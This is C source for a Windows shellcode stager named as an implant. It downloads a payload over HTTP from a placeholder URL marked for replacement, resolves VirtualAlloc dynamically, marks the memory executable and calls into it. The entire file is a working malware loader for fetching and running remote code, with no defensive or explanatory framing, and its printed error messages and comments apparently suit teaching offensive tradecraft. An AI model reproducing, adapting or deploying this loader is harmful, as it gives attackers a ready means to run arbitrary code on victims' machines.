//x86_64-w64-mingw32-gcc remoteloader.c -lwininet -o implant.exe
#include <stdio.h>
#include <windows.h>
#include <wininet.h>

#pragma comment(lib, "wininet.lib")

typedef LPVOID (WINAPI *VirtualAlloc_t)(LPVOID, SIZE_T, DWORD, DWORD);

BOOL GetPayloadFromUrl(LPCWSTR szUrl, PBYTE* pPayloadBytes, SIZE_T* sPayloadSize) {
    BOOL bSTATE = TRUE;
    HINTERNET hInternet = NULL, hInternetFile = NULL;
    DWORD dwBytesRead = 0;
    SIZE_T sSize = 0;
    PBYTE pBytes = NULL, pTmpBytes = NULL;

    hInternet = InternetOpenW(NULL, INTERNET_OPEN_TYPE_PRECONFIG, NULL, NULL, 0);
    if (hInternet == NULL) {
        printf("[!] InternetOpenW Failed With Error : %d \n", GetLastError());
        bSTATE = FALSE; goto _EndOfFunction;
    }

    hInternetFile = InternetOpenUrlW(hInternet, szUrl, NULL, 0, INTERNET_FLAG_HYPERLINK | INTERNET_FLAG_IGNORE_CERT_DATE_INVALID, 0);
    if (hInternetFile == NULL) {
        printf("[!] InternetOpenUrlW Failed With Error : %d \n", GetLastError());
        bSTATE = FALSE; goto _EndOfFunction;
    }

    pTmpBytes = (PBYTE)LocalAlloc(LPTR, 1024);
    if (pTmpBytes == NULL) {
        bSTATE = FALSE; goto _EndOfFunction;
    }

    while (TRUE) {
        if (!InternetReadFile(hInternetFile, pTmpBytes, 1024, &dwBytesRead)) {
            printf("[!] InternetReadFile Failed With Error : %d \n", GetLastError());
            bSTATE = FALSE; goto _EndOfFunction;
        }

        sSize += dwBytesRead;

        if (pBytes == NULL)
            pBytes = (PBYTE)LocalAlloc(LPTR, sSize);
        else
            pBytes = (PBYTE)LocalReAlloc(pBytes, sSize, LMEM_MOVEABLE | LMEM_ZEROINIT);

        if (pBytes == NULL) {
            bSTATE = FALSE; goto _EndOfFunction;
        }

        memcpy((PVOID)(pBytes + (sSize - dwBytesRead)), pTmpBytes, dwBytesRead);
        memset(pTmpBytes, '\0', dwBytesRead);

        if (dwBytesRead < 1024) {
            break;
        }
    }

    *pPayloadBytes = pBytes;
    *sPayloadSize = sSize;

_EndOfFunction:
    if (hInternet)
        InternetCloseHandle(hInternet);
    if (hInternetFile)
        InternetCloseHandle(hInternetFile);
    if (hInternet)
        InternetSetOptionW(NULL, INTERNET_OPTION_SETTINGS_CHANGED, NULL, 0);
    if (pTmpBytes)
        LocalFree(pTmpBytes);
    return bSTATE;
}

int main() {
    HMODULE hKernel32 = NULL;
    WCHAR wKernel32[] = L"kernel32.dll";
    CHAR cVirtualAlloc[] = "VirtualAlloc";
    DWORD oldProtect = 0;
    PBYTE uPayload = NULL;
    SIZE_T szPayloadLen = 0;

    // URL to the payload, REPLACE THIS
    LPCWSTR szUrl = L"http://127.0.0.1:9001/calc.bin";

    if (!GetPayloadFromUrl(szUrl, &uPayload, &szPayloadLen)) {
        printf("Failed to download payload\n");
        return 1;
    }

    // Load kernel32.dll
    hKernel32 = GetModuleHandleW(wKernel32);
    if (hKernel32 == NULL) {
        printf("Failed to get handle to kernel32.dll\n");
        return 1;
    }

    // Get the address of VirtualAlloc
    VirtualAlloc_t pVirtualAlloc = (VirtualAlloc_t)GetProcAddress(hKernel32, cVirtualAlloc);
    if (pVirtualAlloc == NULL) {
        printf("Failed to get address of VirtualAlloc\n");
        return 1;
    }

    // Allocate new memory
    LPVOID pvExecMem = pVirtualAlloc(NULL, szPayloadLen, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
    if (pvExecMem == NULL) {
        printf("Failed to allocate memory\n");
        return 1;
    }

    // Copy the payload into the new memory
    RtlCopyMemory(pvExecMem, uPayload, szPayloadLen);

    // Change memory protection to executable
    if (!VirtualProtect(pvExecMem, szPayloadLen, PAGE_EXECUTE_READ, &oldProtect)) {
        printf("Failed to change memory protection\n");
        return 1;
    }

    // Execute the shellcode
    void (*fp)() = (void (*)())pvExecMem;
    fp();

    return 0;
}
